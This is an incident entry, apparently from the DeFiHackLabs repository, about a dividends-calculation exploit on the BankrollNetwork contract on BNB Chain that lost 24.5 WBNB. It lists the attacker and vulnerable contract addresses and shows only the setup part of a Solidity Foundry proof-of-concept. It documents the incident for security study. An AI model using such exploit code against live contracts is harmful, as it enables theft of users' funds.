# [?] BankrollNetwork - Incorrect dividends calculation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BankrollNetwork
Published: 2025-06-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/BankrollNetwork_exp.sol
Type: defi-exploit-poc

## Details
Lost: 24.5 WBNB

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 24.5 WBNB
// Attacker : https://bscscan.com/address/0x2dea406bb3bea68d6be8d9ef0071fdf63082fb52
// Attack Contract : https://bscscan.com/address/0xe63a5c681cacb8484c8a989cfdd41b8e3b7a2be2
// Vulnerable Contract : https://bscscan.com/address/0xAdEfb902CaB716B8043c5231ae9A50b8b4eE7c4e
// Attack Tx : https://bscscan.com/tx/0x7226b3947c7e8651982e5bd777bca52d03ea31d19b515dec123595a4435ae22c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xAdEfb902CaB716B8043c5231ae9A50b8b4eE7c4e#code

// @Analysis
// Post-mortem : https://x.com/Phalcon_xyz/status/1943518566831296566
// Twitter Guy : https://x.com/TenArmorAlert/status/1935618109802459464
// Hacking God : N/A
pragma solidity ^0.8.0;

contract BankrollNetwork is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 51_715_418 - 1;
    uint256 borrow_amount;
    
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUniswapV2Pair pair = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IBankrollNetworkStack bankRollNetwork = IBankrollNetworkStack(0xAdEfb902CaB716B8043c5231ae9A50b8b4eE7c4e);
    

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(WBNB);
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/BankrollNetwork_exp.sol_
